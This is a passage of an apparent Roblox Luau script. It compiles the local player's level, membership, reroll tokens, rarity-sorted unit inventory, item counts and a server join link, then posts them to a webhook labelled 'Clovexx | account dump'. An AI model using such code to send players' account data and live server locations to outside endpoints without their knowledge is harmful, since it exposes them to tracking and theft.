    end
    fields[#fields + 1] = { name = "Level", value = levelText, inline = true }
    local mem = tostring(lp.MembershipType or "None"):gsub("Enum.MembershipType.", "")
    fields[#fields + 1] = { name = "Membership", value = mem, inline = true }
    local tokens = tonumber(session.profile_data.trait_reroll_tokens) or 0
    fields[#fields + 1] = { name = "Reroll tokens", value = tostring(tokens), inline = true }
    local owned = ownedUnits()
    local groups, totalUnits = {}, 0
    for _, u in pairs(owned) do
        totalUnits += 1
        local info = unitInfo[u.unit_id] or {}
        local rar = info.rarity or "Unknown"
        groups[rar] = groups[rar] or {}
        local nm = info.name or tostring(u.unit_id)
        local shiny = u.shiny and "*" or ""
        local lvlU = tonumber(u.level) or 1
        local traits = ""
        if type(u.traits) == "table" and #u.traits > 0 then
            local tl = {}
            for _, t in ipairs(u.traits) do
                local tr = t.trait or t.id or "?"
                local tier = tonumber(t.tier) or 1
                tl[#tl + 1] = tier > 1 and (tr .. " " .. tier) or tr
            end
            traits = " | " .. table.concat(tl, "+")
        end
        local line = string.format("%s%s%s%s", shiny, nm,
            lvlU > 1 and (" Lv" .. lvlU) or "", traits)
        groups[rar][line] = (groups[rar][line] or 0) + 1
    end
    local ui_, ni_ = uniqueItems(), normalItems()
    local uniqCount, normCount = 0, 0
    for _ in pairs(ui_) do uniqCount += 1 end
    for _, c in pairs(ni_) do normCount += tonumber(c) or 0 end
    fields[#fields + 1] = {
        name = "Collection",
        value = string.format("units **%d**\nunique items **%d**\nnormal items **%d**",
            totalUnits, uniqCount, normCount),
        inline = false,
    }
    local ORDER = { "Exclusive", "Secret", "Mythic", "Legendary", "Epic", "Rare", "Common", "Unknown" }
    local ICON = { Exclusive = "--", Secret = "--", Mythic = "--", Legendary = "--",
                   Epic = "--", Rare = "--", Common = "o", Unknown = "?" }
    for _, rar in ipairs(ORDER) do
        local g = groups[rar]
        if g then
            local lines, count = {}, 0
            for line, n in pairs(g) do
                lines[#lines + 1] = n > 1 and (line .. " x" .. n) or line
                count += n
            end
            table.sort(lines)
            local chunk, size = {}, 0
            local hdr = (ICON[rar] or "") .. " " .. rar .. " (" .. count .. ")"
            for _, l in ipairs(lines) do
                if size + #l + 1 > 950 then
                    fields[#fields + 1] = { name = hdr, value = table.concat(chunk, "\n"), inline = false }
                    hdr = hdr .. " cont."
                    chunk, size = {}, 0
                end
                chunk[#chunk + 1] = l
                size += #l + 1
            end
            if #chunk > 0 then
                fields[#fields + 1] = { name = hdr, value = table.concat(chunk, "\n"), inline = false }
            end
        end
    end
    local jobId = game.JobId or ""
    fields[#fields + 1] = {
        name = "Server",
        value = "[join](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. jobId .. ")\n`" .. jobId .. "`",
        inline = false,
    }
    while #fields > 4 do
        local total = 0
        for _, f in ipairs(fields) do total += #f.name + #f.value end
        if total < 5500 then break end
        table.remove(fields)
    end
    while #fields > 25 do table.remove(fields) end
    postWebhook("Clovexx | account dump", "", 5763719, fields)
end
